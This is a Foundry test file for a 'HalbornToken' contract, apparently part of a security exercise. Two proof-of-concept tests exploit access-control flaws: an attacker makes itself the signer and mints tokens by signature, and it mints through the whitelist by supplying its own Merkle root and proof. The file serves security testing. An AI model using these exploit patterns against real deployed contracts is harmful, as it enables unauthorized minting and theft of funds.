// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/HalbornToken.sol";
import "../lib/murky/src/Merkle.sol";

contract HalbornTokenTest is Test {
    HalbornToken public halbornToken;

    uint256 constant nEmployees = 100;
    address owner = address(0x1000);

    function setUp() public {
        vm.prank(owner);
        halbornToken = new HalbornToken("Halborn Token", "HLBN", 10000_000000000000000000, owner, bytes32(0));

        for (uint256 i; i < nEmployees; i++) {
            address employee = address(uint160(1000+i));

            vm.prank(owner);
            halbornToken.transfer(employee, 100_000000000000000000);

            vm.prank(employee);
            halbornToken.newTimeLock(100_000000000000000000, block.timestamp + 1, block.timestamp + 6*30.5 days, block.timestamp + 365 days);
        }
    }

    /*function testTransfer() public {
        address employee1 = address(uint160(1001));
        address employee2 = address(uint160(1002));

        vm.warp(block.timestamp + 8*30.5 days);

        vm.startPrank(employee1);
        uint256 maxTransferable = halbornToken.calcMaxTransferrable(employee1);
        console.log("maxTransferable", maxTransferable);
        halbornToken.transfer(employee2, maxTransferable);

        maxTransferable = halbornToken.calcMaxTransferrable(employee2);
        console.log("maxTransferable", maxTransferable);
    }*/

    /**
    * El atacante mintea tokens mediante firma sin ser el signer legítimo
     */
    function testMintTokensWithSignature() public {
        bytes32 privateKey = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
        address attacker = vm.addr(uint256(privateKey)); //0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
        vm.startPrank(attacker);

        uint256 amount = 1000_000000000000000000;
        bytes memory prefix = "\x19Ethereum Signed Message:\n32";
        bytes32 messageHash = keccak256(
            abi.encode(address(halbornToken), amount, attacker)
        );
        bytes32 hashToCheck = keccak256(abi.encodePacked(prefix, messageHash));

        bytes32 r;
        bytes32 s;
        uint8 v;
        (v, r, s) = vm.sign(uint256(privateKey), hashToCheck);

        halbornToken.setSigner(attacker);
        halbornToken.mintTokensWithSignature(amount, r, s, v);

        assert(halbornToken.balanceOf(attacker) == amount);

        console.log("The attacker has minted tokens with signature without being the legitimate signer");
    }

    /**
    *   El atacante mintea tokens mediante la función de whitelist sin estar en la whitelist
    */
    function testMintTokensWithWhitelist() public {
        bytes32 privateKey = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
        address attacker = vm.addr(uint256(privateKey)); //0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
        uint256 amount = 1000_000000000000000000;

        vm.startPrank(attacker);

        // https://github.com/dmfxyz/murky
        Merkle merkle = new Merkle();
        bytes32[] memory data = new bytes32[](2);
        data[0] = bytes32("0x1001");
        data[1] = keccak256(abi.encodePacked(attacker));
        bytes32 root = merkle.getRoot(data);
        bytes32[] memory proof = merkle.getProof(data, 1);

        halbornToken.mintTokensWithWhitelist(amount, root, proof);

        assert(halbornToken.balanceOf(attacker) == amount);

        console.log("The attacker has minted tokens via whitelist without being in the whitelist");
    }
}